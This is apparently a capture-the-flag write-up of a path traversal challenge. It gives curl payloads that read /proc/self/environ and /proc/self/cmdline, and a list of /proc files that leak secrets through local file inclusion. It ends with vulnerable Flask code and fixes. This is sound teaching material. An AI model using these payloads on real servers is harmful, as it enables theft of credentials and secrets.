TL;DR

The challenge exposed a /etching?plate= endpoint that read files by filename. By substituting an absolute path to /proc/self/environ — a Linux pseudo-file that exposes the running process's environment variables — we retrieved the flag that was stored as an environment variable in the Python WSGI server process.

Challenge Description

The challenge lore read:

"The giants of Jotunheim preserve their etchings within the forge, each plate cataloged for those allowed to inspect them. Yet the forge is old, and old paths often hide cracks where careful hands may slip through. One note, meant for no outsider, remains etched beyond its rightful place. Find the hidden inscription and claim the flag."

Visiting http://lab.redfoxsec.com:8404/ revealed a listing of "etchings" — catalog entries. The page linked to entries like /etching?plate=1, suggesting a file-based read system where the plate parameter controlled which file was served.

Step 1 — Discovering the Vulnerable Endpoint

We ran gobuster to enumerate endpoints, but the server returned 200 for all paths (wildcard responses). We fixed this by excluding the default response length:

bash 
# First run — wildcard responses block gobuster
gobuster dir -u http://lab.redfoxsec.com:8404/ \
  -w /usr/share/wordlists/dirb/common.txt
# Error: server returns 200 for non-existing URLs (length: 1476)

# Fix: exclude that response length
gobuster dir -u http://lab.redfoxsec.com:8404/ \
  -w /usr/share/wordlists/dirb/common.txt \
  --exclude-length 1476

Gobuster output:

output 
/health               (Status: 200) [Size: 2]
# Only /health was real — plus the main page with /etching?plate=

The main page exposed the endpoint: /etching?plate=<filename>. Combined with the response headers revealing Server: WSGIServer/0.2 CPython/3.11.15, we knew this was a Python application serving files based on user input.

Step 2 — Testing Path Traversal

We tried classic path traversal with relative paths first:

bash — attempts 
# Classic relative traversal
curl "http://lab.redfoxsec.com:8404/etching?plate=../flag.txt"
curl "http://lab.redfoxsec.com:8404/etching?plate=../../flag.txt"

# Null byte (Python 3 is immune to this)
curl "http://lab.redfoxsec.com:8404/etching?plate=../flag.txt%00"

# URL encoded
curl "http://lab.redfoxsec.com:8404/etching?plate=..%2Fflag.txt"

All returned HTTP 500 — not a 403 or "access denied". This was actually a positive sign:

⚡ Key Insight

A 500 error means the traversal reached the file system but couldn't find the file — not that it was blocked. A 403 would mean the server detected and blocked traversal. 500 means we have access to the filesystem, we just need the right path.

Step 3 — Enumerating with /proc

Since relative paths couldn't locate flag.txt, we switched strategy. Linux's /proc pseudo-filesystem exposes process information as readable files — and crucially, we can access it with absolute paths.

The /proc Filesystem

On every Linux system, /proc/self/ is a special directory that always points to the currently running process. It contains files that expose the process's internals:

// /proc/self — process information
/proc/self/
├── environ← environment variables (FLAG is here!)
├── cmdline← command that started the process
├── cwd← symlink to current working directory
├── exe← symlink to the executable binary
├── maps← memory map of the process
├── status← process status (PID, state, etc)
└── fd/← open file descriptors

We first used /proc/self/cmdline to confirm traversal worked and identify the working directory:

bash 
curl "http://lab.redfoxsec.com:8404/etching?plate=/proc/self/cmdline"

This returned the command used to start the Python server, confirming absolute path traversal worked!

Step 4 — Reading /proc/self/environ

With absolute path traversal confirmed, we hit the jackpot target — /proc/self/environ. This file contains all environment variables for the running process, including any secrets or flags set at startup.

bash 
# environ contains binary data (null-separated) — force output
curl --output - "http://lab.redfoxsec.com:8404/etching?plate=/proc/self/environ"

curl warned us about binary output — we used --output - to force it to print anyway. The response contained all environment variables of the Python WSGI process, null-byte separated:

Useful /proc Files in LFI Attacks

When you have Local File Inclusion on a Linux system, /proc/self/ is often more useful than trying to guess file paths. Here are the most valuable targets:

/proc/self/environ
Environment variables of the process. Often contains secrets, flags, API keys, database credentials, and configuration values set at container startup.
USED IN THIS CHALLENGE
/proc/self/cmdline
The command used to start the process. Reveals the working directory, script path, and interpreter. Useful for finding where config files live.
/proc/self/cwd
Symlink to the current working directory. Once you know the CWD, relative paths become absolute — find config.py, app.py, .env files etc.
/proc/self/exe
Symlink to the executable binary. Reading it returns the Python interpreter binary — less useful for flags but confirms the runtime.
/proc/self/fd/
Open file descriptors. fd/0 = stdin, fd/1 = stdout, fd/2 = stderr. Higher numbers may point to open log files or config files.
/proc/self/maps
Memory map of the process. Shows all loaded libraries and their paths — useful for finding exact file locations on the system.

Why This Works — Vulnerable Server Code

The vulnerability exists because the server passes the plate parameter directly to a file-open call without any validation:

python — vulnerable server code (conceptual) 
from flask import Flask, request, Response
import os

app = Flask(__name__)
ETCHINGS_DIR = "/app/etchings/"

@app.route('/etching')
def etching():
    plate = request.args.get('plate')  # user-controlled

    # ❌ VULNERABLE: no path sanitization
    file_path = os.path.join(ETCHINGS_DIR, plate)

    # When plate = "/proc/self/environ":
    # os.path.join("/app/etchings/", "/proc/self/environ")
    # = "/proc/self/environ"  ← absolute path wins!

    with open(file_path, 'rb') as f:
        return Response(f.read(), mimetype='text/plain')
⚡ Python os.path.join Gotcha

In Python, os.path.join(base, "/absolute/path") discards the base entirely and returns just the absolute path. This is the exact behavior that makes absolute path injection work even when the developer thought they were safely joining paths.

python — os.path.join behavior 
import os

# Normal usage
os.path.join("/app/etchings", "plate1.txt")
# → "/app/etchings/plate1.txt"  ✓ safe

# Absolute path injection — base is DISCARDED
os.path.join("/app/etchings", "/proc/self/environ")
# → "/proc/self/environ"  ← base gone, attacker wins!

# Relative traversal also works
os.path.join("/app/etchings", "../../etc/passwd")
# → "/app/etchings/../../etc/passwd"
# → resolves to "/etc/passwd"

The Fix — Path Sanitization

Method 1 — os.path.realpath + base check

The most reliable fix is to resolve the full real path and verify it starts with the intended base directory:

python — secure implementation 
import os

BASE_DIR = "/app/etchings"

def safe_read(plate):
    # Resolve symlinks and normalize the path
    requested = os.path.realpath(
        os.path.join(BASE_DIR, plate)
    )

    # Verify it's still inside our base directory
    if not requested.startswith(BASE_DIR + os.sep):
        raise PermissionError("Access denied: path escapes base directory")

    with open(requested, 'rb') as f:
        return f.read()

Method 2 — Allowlist approach

For maximum security, use an allowlist of permitted file identifiers mapped to actual paths — never use user input as any part of a file path:

python — allowlist approach 
ALLOWED_PLATES = {
    "1": "/app/etchings/plate1.txt",
    "2": "/app/etchings/plate2.txt",
    "3": "/app/etchings/plate3.txt",
}

def safe_read(plate_id):
    if plate_id not in ALLOWED_PLATES:
        raise ValueError(f"Unknown plate: {plate_id}")

    with open(ALLOWED_PLATES[plate_id], 'rb') as f:
        return f.read()

Never store secrets in environment variables on vulnerable servers. Even if path traversal is fixed, secrets should live in a secrets manager (AWS Secrets Manager, HashiCorp Vault, etc.) — not as process environment variables that can be read from /proc/self/environ.
